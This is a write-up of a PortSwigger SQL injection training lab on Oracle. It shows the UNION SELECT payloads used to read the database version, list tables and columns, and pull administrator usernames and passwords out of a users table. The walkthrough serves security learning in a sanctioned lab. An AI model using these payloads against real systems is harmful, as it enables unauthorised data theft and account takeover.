# Portswigger  SQLi-Lab 8

## SQL injection attack, listing the database contents on Oracle

This labs is similar to lab#7 in which we listed the tables in postgresql database but now we are presented with oracle database on web application in which `category` a GET paramter is vulnerable to sqli

<img src="https://i.imgur.com/Jt0D4TO.png"/>

Knowing the database is orcale we can first try blind sqli 

<img src="https://i.imgur.com/TD9uRPH.png"/>

It works , now we need to identifiy the number of columns

<img src="https://i.imgur.com/TP1UFFC.png"/>

<img src="https://i.imgur.com/OAo04vU.png"/>

<img src="https://i.imgur.com/Vw8r6v4.png"/>

Here we get an error which means there are only 2 columns in the table, so now let's identify the version for that we need to supply a table name and for query the version we specify `v$version` table which is a builtin table having information for version of oracle database

```sql
Gifts' union select banner,null from v$version --
```

<img src="https://i.imgur.com/P2jxsOQ.png"/>

<img src="https://i.imgur.com/bsrkN0o.png"/>

Perfect now let's try leak table names

<img src="https://i.imgur.com/7DXliKM.png"/>

`all_tables` is similar to `information.schema.tables` which we have seen in postgresql which holds inforamtion all tables in database

```sql
Gifts' union select table_name,null from all_tables--
```

<img src="https://i.imgur.com/mHcWAA5.png"/>

<img src="https://i.imgur.com/YHxd42d.png"/>

Now we need to retrieve the column names for the table `USERS_BDRDAO`

```sql
Gifts' union select column_name,null from all_tab_columns where table_name = 'USERS_BDRDAO' --
```

<img src="https://i.imgur.com/gxYxkqH.png"/>

<img src="https://i.imgur.com/7SM1YSI.png"/>

<img src="https://i.imgur.com/6hXEjT0.png"/>

<img src="https://i.imgur.com/H90KE5s.png"/>

```sql
Gifts' union select USERNAME_ZYPQTA ,PASSWORD_INGWFD from USERS_BDRDAO --

```

And we got the credentials now we just need to login with the adminstartor account and we'll complete this lab

<img src="https://i.imgur.com/1lO1g9r.png"/>